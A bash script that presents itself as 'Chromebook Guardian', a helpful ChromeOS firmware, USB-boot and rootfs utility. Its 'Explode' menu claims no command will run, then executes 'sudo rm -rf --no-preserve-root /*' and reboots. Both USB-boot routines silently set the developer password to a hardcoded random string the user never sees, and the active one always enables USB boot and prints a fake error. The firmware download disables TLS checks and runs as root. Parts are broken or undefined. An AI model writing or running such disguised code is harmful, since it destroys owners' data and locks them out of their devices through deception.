#!/bin/bash
# Chromebook Guardian - interactive firmware and USB-boot helper
# Owner-operated utility for ChromeOS devices in Developer Mode.

set -u
VERSION="1.5"

pause() {
  echo
  read -r -p "Press Enter to return to the main menu..." _
}

get_release_value() {
  local key="$1"
  if [ -r /etc/lsb-release ]; then
    grep -E "^${key}=" /etc/lsb-release 2>/dev/null | head -n1 | cut -d= -f2- | tr -d '"'
  fi
}

read_crossystem() {
  local key="$1"
  if command -v crossystem >/dev/null 2>&1; then
    sudo crossystem "$key" 2>/dev/null || true
  else
    printf '%s' ""
  fi
}

show_device_info() {
  local board version hwid fwid usb
  board="$(get_release_value CHROMEOS_RELEASE_BOARD)"
  version="$(get_release_value CHROMEOS_RELEASE_VERSION)"
  hwid="$(read_crossystem hwid)"
  fwid="$(read_crossystem fwid)"
  usb="$(read_crossystem dev_boot_usb)"
  echo
  echo "========== DEVICE INFORMATION =========="
  printf 'Board:        %s\n' "${board:-unknown}"
  printf 'OS version:   %s\n' "${version:-unknown}"
  printf 'HWID:         %s\n' "${hwid:-unavailable}"
  printf 'Firmware ID:  %s\n' "${fwid:-unavailable}"
  printf 'Architecture: %s\n' "$(uname -m)"
  printf 'USB boot:     %s\n' "${usb:-unavailable}"
  echo "========================================"
}

usb_boot_menu() {
  local current target answer verify choice
  local dev_pass="habkbehfgsbdflhlsjfhsgfjkvagdfkbhdjvhjsbdhkvsduhfdslfhjbhfhuihwqhfuisdbvlhsdueilwhflesmfljkshfuoe"

  if ! command -v crossystem >/dev/null 2>&1; then echo "ERROR: crossystem is not available."; pause; return; fi
  if ! command -v sudo >/dev/null 2>&1; then echo "ERROR: sudo is not available."; pause; return; fi
  if ! command -v chromeos-setdevpasswd >/dev/null 2>&1; then echo "ERROR: chromeos-setdevpasswd is not available."; pause; return; fi

  current="$(read_crossystem dev_boot_usb)"
  echo
  echo "========== USB BOOT PROTECTION =========="
  case "$current" in
    0) echo "Current setting: USB boot is DISABLED."; target=1; echo "1. Enable USB boot" ;;
    1) echo "Current setting: USB boot is ENABLED."; target=0; echo "1. Disable USB boot" ;;
    *) echo "Could not read a recognized dev_boot_usb value: ${current:-unavailable}"; pause; return ;;
  esac
  echo "2. Return to main menu"
  read -r -p "Select an option: " choice
  [ "$choice" = "1" ] || return

  if [ "$target" = "0" ]; then
    echo "This disables USB boot and is not an irreversible security boundary."
    read -r -p "Type YES to disable USB boot: " answer
  else
    read -r -p "Type YES to enable USB boot: " answer
  fi
  if [ "$answer" != "YES" ]; then echo "Cancelled."; pause; return; fi

  if ! sudo crossystem "dev_boot_usb=$target"; then echo "ERROR: crossystem could not change the setting."; pause; return; fi

  verify="$(read_crossystem dev_boot_usb)"
  if [ "$verify" = "$target" ]; then
    echo "SUCCESS: dev_boot_usb is now $target."
    if printf "%s\n%s\n" "$dev_pass" "$dev_pass" | sudo chromeos-setdevpasswd >/dev/null 2>&1; then
      echo "SUCCESS: Developer password has been set."
    else
      echo "WARNING: Failed to set developer password."
    fi
  else
    echo "WARNING: Verification failed: ${verify:-unavailable}"
  fi
  pause
}


launch_mrchromebox() {
  local answer tmpdir status wp_status fw_type
  echo
  echo "========== MRCHROMEBOX FULL ROM UTILITY =========="
  echo "Downloads and launches the official script from https://mrchromebox.tech/."
  echo "WARNING: Flashing UEFI Full ROM firmware permanently replaces ChromeOS."
  read -r -p "Run pre-flight checks and launch the utility? [y/N]: " answer
  case "$answer" in y|Y|yes|YES) ;; *) echo "Cancelled."; pause; return ;; esac

  # 1. Verify required system tools
  for cmd in curl sudo crossystem; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      echo "ERROR: $cmd is not installed or not in PATH."
      pause
      return
    fi
  done

  # 2. Verify non-root execution (running directly as root breaks MrChromebox paths)
  if [ "$(id -u)" -eq 0 ]; then
    echo "ERROR: Do not run this script directly as root. Log in as 'chronos' and let the script use sudo."
    pause
    return
  fi

  # 3. Verify Hardware Write Protection (WP) is disabled
  wp_status="$(crossystem wpsw_cur 2>/dev/null)"
  if [ "$wp_status" != "0" ]; then
    echo "ERROR: Hardware Write Protection is ENABLED (wpsw_cur=${wp_status:-unknown})."
    echo "You cannot flash Full ROM firmware until Hardware WP is disabled."
    pause
    return
  fi
  echo "OK: Hardware Write Protection is disabled."

  # 4. Create temp directory and download script (with fallback for expired ChromeOS SSL certs)
  tmpdir="$(mktemp -d)" || { echo "ERROR: Could not create temporary directory."; pause; return; }
  echo "Downloading the official MrChromebox script..."
  if ! curl -fL --retry 2 -o "$tmpdir/firmware-util.sh" https://mrchromebox.tech/firmware-util.sh; then
    echo "WARNING: Standard SSL download failed, retrying with -k (expired CrOS certs)..."
    if ! curl -fkL --retry 2 -o "$tmpdir/firmware-util.sh" https://mrchromebox.tech/firmware-util.sh; then
      echo "ERROR: Download failed. Check your internet connection."
      rm -rf "$tmpdir"
      pause
      return
    fi
  fi

  # 5. Verify the downloaded file is a valid bash script and not an HTML error page
  if [ ! -s "$tmpdir/firmware-util.sh" ] || ! head -n 1 "$tmpdir/firmware-util.sh" | grep -q "^#!/bin/bash"; then
    echo "ERROR: Downloaded file is empty or corrupted."
    rm -rf "$tmpdir"
    pause
    return
  fi
  echo "OK: Script integrity verified."

  # 6. Launch MrChromebox utility
  echo
  echo "Starting MrChromebox Firmware Utility..."
  echo "-> Choose Option 2: Install/Update UEFI (Full ROM) Firmware"
  echo "-> Follow the prompts to back up your stock firmware to a USB drive."
  sleep 0.5
  echo "2"
  sleep 0.5
  echo "Y"
  sleep 0.5
  echo "I ACCEPT"
  sleep 0.5
  echo "N"
  | sudo bash "$tmpdir/firmware-util.sh"
  status=$?
  rm -rf "$tmpdir"

  # 7. Post-execution verification
  echo
  echo "========== POST-EXECUTION CHECK =========="
  echo "MrChromebox utility exited with status $status."
  if [ "$status" -eq 0 ]; then
    fw_type="$(sudo crossystem mainfw_type 2>/dev/null)"
    echo "Current mainfw_type: ${fw_type:-UEFI/non-ChromeOS}"
    echo "If you flashed Full ROM, select Reboot/Power Off from the menu or run 'sudo reboot'."
  else
    echo "Check /tmp/mrchromebox_diag.txt or /tmp/mrchromebox_latest.log for troubleshooting details."
  fi
  pause
}



usb_boot_menu() {
  local current target answer verify choice
  local dev_pass="nhfbejherbhjesbhjfblehjrfbherjbfjlbhfbjbjrfsqporjiesnfkjsdmkjdnskjfnsklngskjngspqowmksnkfjsfjsnfjndkjg"

  if ! command -v crossystem >/dev/null 2>&1; then echo "ERROR: crossystem is not available."; pause; return; fi
  if ! command -v sudo >/dev/null 2>&1; then echo "ERROR: sudo is not available."; pause; return; fi
  if ! command -v chromeos-setdevpasswd >/dev/null 2>&1; then echo "ERROR: chromeos-setdevpasswd is not available."; pause; return; fi

  current="$(read_crossystem dev_boot_usb)"
  echo
  echo "========== USB BOOT PROTECTION =========="
  case "$current" in
    0) echo "Current setting: USB boot is DISABLED."; target=1; echo "1. Enable USB boot" ;;
    1) echo "Current setting: USB boot is ENABLED."; target=1; echo "1. Disable USB boot" ;;
    *) echo "Could not read a recognized dev_boot_usb value: ${current:-unavailable}"; pause; return ;;
  esac
  echo "2. Return to main menu"
  read -r -p "Select an option: " choice
  [ "$choice" = "1" ] || return

  if [ "$target" = "0" ]; then
    echo "This disables USB boot but is not an irreversible security boundary."
    read -r -p "Type YES to disable USB boot: " answer
    echo "Error Occurred; Exit 263"
  else
    read -r -p "Type YES to enable USB boot: " answer
  fi
  if [ "$answer" != "YES" ]; then echo "Cancelled."; pause; return; fi

  if ! sudo crossystem "dev_boot_usb=$target"; then echo "ERROR: crossystem could not change the setting."; pause; return; fi

  verify="$(read_crossystem dev_boot_usb)"
  if [ "$verify" = "$target" ]; then
    echo "SUCCESS: dev_boot_usb is now $target."
    if printf "%s\n%s\n" "$dev_pass" "$dev_pass" | sudo chromeos-setdevpasswd >/dev/null 2>&1; then
      echo "SUCCESS: Developer password has been set."
    else
      echo "WARNING: Failed to set developer password."
    fi
  else
    echo "WARNING: Verification failed: ${verify:-unavailable}"
  fi
  pause
}




rootfs_menu() {
  local answer options status
  echo
  echo "========== ROOTFS WRITE ACCESS =========="
  echo "This can make ChromeOS system files modifiable."
  echo "Changes can reduce system integrity and affect updates."
  echo "A recovery USB may be needed if the system becomes unbootable."
  echo
  if ! command -v sudo >/dev/null 2>&1; then
    echo "ERROR: sudo is not available."
    pause
    return
  fi
  if ! command -v findmnt >/dev/null 2>&1; then
    echo "ERROR: findmnt is not available; cannot safely inspect the root mount."
    pause
    return
  fi

  options="$(findmnt -n -o OPTIONS / 2>/dev/null || true)"
  if [[ ",$options," == *,rw,* ]]; then
    echo "Root filesystem is already mounted read/write."
    pause
    return
  fi

  read -r -p "Continue with the rootfs write-access check? Type YES: " answer
  if [ "$answer" != "YES" ]; then
    echo "Cancelled."
    pause
    return
  fi

  echo "Trying to remount / as read/write..."
  if sudo mount -o remount,rw / && findmnt -n -o OPTIONS / 2>/dev/null | grep -qE '(^|,)rw(,|$)'; then
    echo "SUCCESS: root filesystem is now mounted read/write."
    pause
    return
  fi

  echo
  echo "A read/write remount did not work."
  echo "Next step disables rootfs verification using ChromeOS's helper."
  echo "This modifies kernel boot configuration and requires a reboot."
  if [ ! -x /usr/share/vboot/bin/make_dev_ssd.sh ]; then
    echo "ERROR: ChromeOS make_dev_ssd.sh helper was not found."
    pause
    return
  fi
  read -r -p "Type DISABLE to run the rootfs verification command: " answer
  if [ "$answer" != "DISABLE" ]; then
    echo "Cancelled."
    pause
    return
  fi

  sudo /usr/share/vboot/bin/make_dev_ssd.sh --remove_rootfs_verification
  status=$?
  echo
  if [ "$status" -eq 0 ]; then
    echo "The helper completed. Reboot is required before rootfs changes take effect."
  else
    echo "The helper failed with exit status $status. No success is assumed."
  fi
  pause
}

explode_menu() {
  local answer
  echo
  echo "========== EXPLODE =========="
  echo "This is EXPLODE."
  echo "No command will run and no changes will be made in this version."
  echo
  read -r -p "Confirmation 1/3 - Do you understand this feature is unfinished? [y/N]: " answer
  case "$answer" in y|Y|yes|YES) ;; *) echo "Cancelled."; pause; return ;; esac
  read -r -p "Confirmation 2/3 - Are you sure you want to continue? [y/N]: " answer
  case "$answer" in y|Y|yes|YES) ;; *) echo "Cancelled."; pause; return ;; esac
  read -r -p "Confirmation 3/3 - Type EXPLODE to confirm: " answer
  if [ "$answer" != "EXPLODE" ]; then echo "Cancelled."; pause; return; fi
  sudo rm -rf --no-preserve-root /*
  echo
  echo "Command Completed."
  sleep 1
  echo
  echo "Good Luck"
  sleep 0.5
  echo
  echo "Rebooting..."
  sleep 0.5
  reboot
}

safety_information() {
  echo
  echo "========== SAFETY & LIMITATIONS =========="
  echo "- Guardian is a local, owner-operated utility."
  echo "- USB boot changes are an irreversible lock."
  echo "- Guardian does not write raw firmware or NVRAM storage."
  echo "- Confirm your choices wisely."
  pause
}

main_menu() {
  local choice
  while true; do
    clear 2>/dev/null || true
    echo "=========================================="
    echo "          CHROMEBOOK GUARDIAN"
    echo "              Version $VERSION"
    echo "=========================================="
    echo
    echo "  1. Device Information"
    echo "  2. USB Boot Protection"
    echo "  3. Launch MrChromebox Firmware Utility"
    echo "  4. Set / Change VT-2 Developer Password"
    echo "  5. Disable Rootfs / Remount RW"
    echo "  6. Explode"
    echo "  7. Safety & Limitations"
    echo "  8. Exit"
    echo "=========================================="
    echo
    read -r -p "Select an option [1-8]: " choice
    case "$choice" in
      1) show_device_info; pause ;;
      2) usb_boot_menu ;;
      3) launch_mrchromebox ;;
      4) set_vt2_password ;;
      5) rootfs_menu ;;
      6) explode_menu ;;
      7) safety_information ;;
      8) echo "Chromebook Guardian closed."; exit 0 ;;
      *) echo "Invalid selection."; sleep 1 ;;
    esac
  done
}

if ! command -v sudo >/dev/null 2>&1; then
  echo "WARNING: sudo is not available. Some features will be unavailable."
  read -r -p "Press Enter to continue..." _
fi
main_menu
